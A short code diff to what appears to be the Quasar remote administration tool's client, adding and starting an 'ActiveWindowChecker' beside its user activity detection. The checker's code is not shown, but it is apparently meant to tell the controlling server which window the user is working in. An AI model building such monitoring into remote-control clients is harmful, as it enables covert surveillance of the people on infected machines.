@@ -46,6 +46,8 @@ namespace Quasar.Client
         /// </summary>
         private ActivityDetection _userActivityDetection;
 
+        private ActiveWindowChecker _activeWindowChecker;
+
         /// <summary>
         /// Determines whether an installation is required depending on the current and target paths.
         /// </summary>
@@ -136,6 +138,9 @@ namespace Quasar.Client
 
                 _userActivityDetection = new ActivityDetection(_connectClient);
                 _userActivityDetection.Start();
+
+                _activeWindowChecker = new ActiveWindowChecker(_connectClient);
+                _activeWindowChecker.Start();
 
                 new Thread(() =>
                 {
